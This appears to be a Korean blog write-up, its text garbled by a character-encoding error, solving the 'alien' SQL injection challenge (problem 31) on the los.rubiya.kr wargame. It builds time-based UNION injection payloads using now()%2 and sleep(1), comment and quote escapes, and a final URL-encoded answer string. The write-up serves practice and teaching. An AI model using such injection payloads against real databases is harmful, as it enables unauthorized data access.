---
title: "[LOS] 31ë²ˆ ë¬¸ì œ í’€ì´(alien)"
categories:
  - los
tags:
  - los
  - rubiya
  - los 31ë²ˆ
  - los alien

  
toc: true
toc_sticky: true
toc_label: "31ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/sql.png
---

ğŸ’¡ los.rubiya.kr 31ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤. 
{: .notice--warning}


# 31ë²ˆ(alien)
## ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/160232310-f82b6951-0cbd-4bab-8536-03be79eb6dbe.png)

## í’€ì´
ì´ë²ˆ ë¬¸ì œì˜ í´ë¦¬ì–´ ì¡°ê±´ì„ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

1. $queryë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ, 'admin' ì´ì–´ì•¼ í•œë‹¤.
2. $queryë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ, 'admin' ì´ ì•„ë‹ˆì—¬ì•¼ í•œë‹¤.
3. $query2ë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ, 'admin'ì´ ì•„ë‹ˆì—¬ì•¼ í•œë‹¤.
4. $query2ë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ, 'admin' ì´ì–´ì•¼ í•œë‹¤.

ë³´ë©´ ë³´ê¸° 1,2ì™€ 3,4ê°€ ê°ê° ë°˜ëŒ€ì˜ ì¡°ê±´ì„ ê°€ì§€ê³  í†µê³¼ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ë§¨ ì²˜ìŒ ë™ì¼í•œ ì¿¼ë¦¬ì— ëŒ€í•´ì„œ, ì–´ì©”ë•ŒëŠ” 'admin'ì´ ë°˜í™˜ë˜ê³ , í•œë²ˆ ë” ì‹¤í–‰í–ˆì„ ë•ŒëŠ” 'admin'ì´ ë°˜í™˜ë˜ì§€ ì•ŠëŠ” ì¿¼ë¦¬ë¥¼ ì‘ì„±í•´ì•¼ í•©ë‹ˆë‹¤.

ì´ ë¬¸ì œë¥¼ í’€ê¸° ìœ„í•´ì„œ ì¿¼ë¦¬ë¬¸ì— 'ì‹œê°„'ì— ëŒ€í•œ ì¡°ê±´ì´ ë“¤ì–´ê°€ë„ë¡ ì‘ì„±í•´ì•¼ í•©ë‹ˆë‹¤.

ì´ íŠ¸ë¦­ì„ í’€ê¸° ìœ„í•´ì„œ ```now() % 2```ì™€ ```sleep(1)``` ë¥¼ ì´ìš©í•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ì²˜ìŒ ì¿¼ë¦¬ë¬¸ì„ ì‹¤í–‰í–ˆì„ ë•ŒëŠ” ì‹œê°„ì˜ ì´ˆê°€ ì§ìˆ˜ ì´ˆì—¬ì„œ 0ì´ ë°˜í™˜ë˜ê³ , í•´ë‹¹ ì¿¼ë¦¬ë¬¸ ë‚´ì—ì„œ ```sleep(1)``` ì„ í•´ì£¼ë©´ ë™ì¼í•œ ì¿¼ë¦¬ë¬¸ì— ëŒ€í•´ì„œ í•œë²ˆ ë” ì—°ì†ìœ¼ë¡œ ì‹¤í–‰í–ˆì„ ë•Œì—ëŠ” 1ì´ˆê°€ ì§€ë‚¬ê¸° ë•Œë¬¸ì— ```now() % 2```ëŠ” í™€ìˆ˜ ì´ˆê°€ ë˜ê³  1ì´ ë°˜í™˜ë˜ì–´ì„œ ì—°ì†ìœ¼ë¡œ ì‹¤í–‰í–ˆì„ ë•Œ 0,1ì„ ë²ˆê°ˆì•„ì„œ ì¶œë ¥í•˜ê²Œ ë©ë‹ˆë‹¤. 

![image](https://user-images.githubusercontent.com/33647663/160232587-4614693d-5054-4035-9fcf-2881f47e3232.png)

ì´ ê°œë…ì„ ì´ìš©í•´ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±í•´ ì£¼ë©´ ë§Œì•½ ì²«ë²ˆì§¸ $queryì—ì„œ 'admin'ì´ ë°˜í™˜ë˜ë©´ í•œë²ˆ ë” ì¿¼ë¦¬ë¥¼ ì‹¤í–‰í–ˆì„ë•ŒëŠ” 'admio'ê°€ ë°˜í™˜ë˜ê²Œ ë©ë‹ˆë‹¤.

```sql
select id from prob_alien where no=1 union select concat("admi",char(110 + sleep(1) + (now()%2=0)))
```

![image](https://user-images.githubusercontent.com/33647663/160232732-b8e2e0f0-cbf7-4fbb-8c7f-18c34a5db64f.png)


ì´ë ‡ê²Œ í•˜ë©´ sandbox1, sandbox2ë²ˆì˜ ì¡°ê±´ì„ ëª¨ë‘ ë§Œì¡±í•˜ê²Œ í’€ì—ˆìŠµë‹ˆë‹¤. ì´ë²ˆì—ëŠ” query2ë¥¼ ë´ì•¼ í•˜ëŠ”ë° query2ì—ëŠ” í˜„ì¬ ì‹±ê¸€ ì¿¼í„°(')ê°€ ìˆê¸° ë•Œë¬¸ì— ì…ë ¥í•œ ëª¨ë“  ì¿¼ë¦¬ë¬¸ì´ ë¬¸ìì—´ë¡œì¨ ì²˜ë¦¬ë˜ê³  ìˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/160232793-ebfc24f6-d20f-42e8-bbc0-94d46d563676.png)


```sql
$query2
select id from prob_alien where no='1 union select concat("admi",char(110 + sleep(1) + (now()%2=0)))'
```

ì´ì „ ì¿¼ë¦¬ì™€ ë™ì¼í•œ ê°œë…ì„ ì‚¬ìš©í•´ì„œ ì‹±ê¸€ ì¿¼í„°(')ë¡œ ë¬¸ìì—´ì„ íƒˆì¶œí•œ ë’¤ì— ë™ì¼í•œ union select êµ¬ë¬¸ì„ ë³µì‚¬í•´ ì£¼ë©´ ë©ë‹ˆë‹¤. ì´ë•Œ ì¶”ê°€ì ìœ¼ë¡œ ê³ ë ¤í•´ì•¼ í•  ì‚¬í•­ì€ ê¸°ì¡´ queryë¬¸ì´ ìˆ˜ì •ë˜ì§€ ì•Šë„ë¡ ì‹±ê¸€ ì¿¼í„°ë¡œ íƒˆì¶œí•˜ê¸° ì „ì— ì£¼ì„ ë¬¸ì # ì„ ì…ë ¥í•´ì•¼ í•˜ê³ , 

í´ë¦¬ì–´ ì¡°ê±´ì„ ë³´ë©´

1. $queryë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ, 'admin' ì´ì–´ì•¼ í•œë‹¤.
2. $queryë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ, 'admin' ì´ ì•„ë‹ˆì—¬ì•¼ í•œë‹¤.
3. $query2ë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ, 'admin'ì´ ì•„ë‹ˆì—¬ì•¼ í•œë‹¤.
4. $query2ë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ, 'admin' ì´ì–´ì•¼ í•œë‹¤.

2-> 3ë²ˆìœ¼ë¡œ ê°ˆë•Œ o -> x -> x -> o ì´ê¸° ë•Œë¬¸ì— now()%2 = 0 ì—ì„œ now()
%2 =1ë¡œ ë°”ê¿”ì¤˜ì•¼ í•©ë‹ˆë‹¤.
```sql
query2 : select id from prob_alien where no='1 union select concat("admi",char(110 + sleep(1) + (now()%2=0)))#' union select concat("admi",char(110 + sleep(1) + (now()%2=1)))#'
```


![image](https://user-images.githubusercontent.com/33647663/160233002-3f058096-282c-48eb-bb76-9a914165cfb3.png)

ì „ì²´ ì •ë‹µ ì¿¼ë¦¬ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```sql
no=1 union select concat("admi",char(110%2bsleep(1)%2b(now()%2=0)))%23'union select concat("admi",char(110%2bsleep(1)%2b(now()%2=1)))%23
```